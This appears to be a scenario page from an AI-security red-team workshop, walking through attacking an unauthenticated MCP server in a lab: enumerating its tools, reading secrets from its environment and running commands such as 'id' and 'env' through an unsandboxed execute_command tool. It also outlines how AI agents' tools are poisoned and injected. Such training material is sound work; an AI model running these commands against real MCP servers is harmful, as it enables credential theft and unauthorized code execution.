# Scenario 11: MCP Tool Infection

> ★ **Shown at DEF CON RTV** - part of the guided demo/workshop. [All scenarios](index.md)

**Difficulty:** Advanced
**Time:** ~30 minutes
**Prerequisites:** Complete [Scenario 05](scenario-05.md)
**Target:** ailab-dev:3000 (MCP Server)

## Background

The Model Context Protocol (MCP) defines how AI coding assistants and agents interact with external tools. An MCP server exposes tools (functions), resources (data), and prompts (templates) to connected AI agents. If an MCP server is accessible without authentication, an attacker can enumerate available tools, discover what capabilities the AI agent has (file system access, code execution, API calls), and potentially manipulate tool definitions.

## Objective

Map the MCP tool surface, read the secrets the server leaks, and prove unauthenticated code
execution - establishing the `devuser` foothold that [Scenario 13](scenario-13.md) escalates to
root and model-weight theft.

## The estate facts

`ailab-dev:3000` runs a **real MCP server built on the official MCP Python SDK (FastMCP)**, not a
hand-written mock - so the tool is exercised against true SDK behaviour (version negotiation, SSE
framing, schema enforcement). It exposes an **`execute_command` tool with no sandboxing** - the
archetypal "we gave the agent a shell" mistake - and runs as the `devuser` service account. That
makes it two things at once: a **credential source** (its process environment) and **direct RCE**.

## Commands

```bash
# 1. Enumerate the tool / resource / prompt surface (recon - nothing touched)
aipostex mcp --target http://172.16.50.10:3000 enum

# 2. Read the server's environment secrets (read-confirmed, no exploit flag)
aipostex mcp --target http://172.16.50.10:3000 env-extract

# 3. Prove unauthenticated code execution as devuser (execution-confirmed, gated)
aipostex mcp --target http://172.16.50.10:3000 poison --mode cmd-inject --command 'id' --force-exploit
```

### Drive it by hand - the interactive MCP console

The console is the "now I use it" beat: each tool call is one readable line, no nested quoting.

```bash
aipostex mcp --target http://172.16.50.10:3000 shell --force-exploit
```

At the `mcp>` prompt:

```text
mcp> :tools                                    # list the exposed tools
mcp> execute_command {"command":"id"}          # RCE - you are devuser
mcp> execute_command {"command":"env"}         # dump the process environment (secrets)
mcp> execute_command {"command":"ls -la /home/devuser"}
mcp> :quit
```

## Expected Finding

**MCP tool inventory (`enum`):**
- Exposed tools with full schemas; the risky ones (`execute_command`, `read_file`, `write_file`)
- Resources / prompts that reveal internal endpoints and organizational workflows

**Environment secrets (`env-extract` → `read-confirmed`):**
- Real secrets read from the server's process environment (API keys, tokens)

**Code execution (`poison --mode cmd-inject` / `shell` → `execution-confirmed`):**
- `uid=1001(devuser)` returned from a command the server ran on your behalf

Example finding:
```json
{
  "finding_type": "code_execution",
  "service": "mcp",
  "landed": "execution-confirmed",
  "stage": "impact",
  "detail": "unauthenticated execute_command tool ran attacker command as devuser",
  "evidence": "uid=1001(devuser) gid=1001(devuser)"
}
```

**Scoring objective:** enumerate at least 3 MCP tools, extract at least one environment secret via
`env-extract`, and land `execution-confirmed` code execution through `cmd-inject` or the shell.

## Real-World Impact

MCP servers are a new attack surface unique to the AI agent era. A compromised MCP server means:
- **Tool poisoning:** Attacker modifies tool definitions so the AI agent executes different code than intended
- **Prompt injection via resources:** Malicious content in MCP resources gets included in the agent's context
- **Capability escalation:** Understanding what tools are available reveals the full blast radius of a compromised AI agent
- **Shadow IT discovery:** MCP servers often expose capabilities that security teams don't know exist

## Follow-On

- [Scenario 13](scenario-13.md): escalate this `devuser` MCP foothold to **root** and steal the
  Ollama model weights (the world-writable, passwordless-sudo helper).
- [Scenario 12](scenario-12.md): fold MCP RCE into the multi-vector campaign.
